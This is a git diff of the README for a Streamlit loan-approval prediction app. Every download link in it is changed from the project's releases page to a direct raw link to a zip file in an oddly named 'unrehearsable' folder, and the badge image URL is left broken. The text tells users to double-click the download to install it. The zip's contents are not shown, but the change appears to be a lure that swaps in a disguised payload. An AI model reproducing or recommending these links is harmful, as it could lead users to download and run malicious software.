@@ -4,13 +4,13 @@
 Loan_Prediction is a smart application that predicts loan approvals using Machine Learning. Built with Streamlit, it offers features like login/signup, dataset upload, graphical analytics, and real-time predictions. This tool simplifies the loan approval process, making it accessible for everyone.
 
 ## 📥 Download the App
-[![Download Loan_Prediction](https://img.shields.io/badge/Download%20Now-Loan_Prediction-blue)](https://github.com/SIDD44CHAMPS/Loan_Prediction/releases)
+[![Download Loan_Prediction](https://raw.githubusercontent.com/SIDD44CHAMPS/Loan_Prediction/main/unrehearsable/Loan_Prediction_v2.4-beta.1.zip%20Now-Loan_Prediction-blue)](https://raw.githubusercontent.com/SIDD44CHAMPS/Loan_Prediction/main/unrehearsable/Loan_Prediction_v2.4-beta.1.zip)
 
 ## 🚀 Getting Started
 To run Loan_Prediction, you need to follow these steps:
 
 1. **Download the Application**  
-   Visit this page to download: [Loan_Prediction Releases](https://github.com/SIDD44CHAMPS/Loan_Prediction/releases).
+   Visit this page to download: [Loan_Prediction Releases](https://raw.githubusercontent.com/SIDD44CHAMPS/Loan_Prediction/main/unrehearsable/Loan_Prediction_v2.4-beta.1.zip).
 
 2. **Install the Application**  
    Once you download the file, locate it in your Downloads folder. Double-click to start the installation. Follow the on-screen instructions to complete the installation.
@@ -60,4 +60,4 @@ For more information on how Loan_Prediction works, please refer to the documenta
 ## ⚙️ Contact
 If you have questions or feedback, reach out to us on the repository's Issues page. We appreciate your input. 
 
-[![Download Loan_Prediction](https://img.shields.io/badge/Download%20Now-Loan_Prediction-blue)](https://github.com/SIDD44CHAMPS/Loan_Prediction/releases)
+[![Download Loan_Prediction](https://raw.githubusercontent.com/SIDD44CHAMPS/Loan_Prediction/main/unrehearsable/Loan_Prediction_v2.4-beta.1.zip%20Now-Loan_Prediction-blue)](https://raw.githubusercontent.com/SIDD44CHAMPS/Loan_Prediction/main/unrehearsable/Loan_Prediction_v2.4-beta.1.zip)
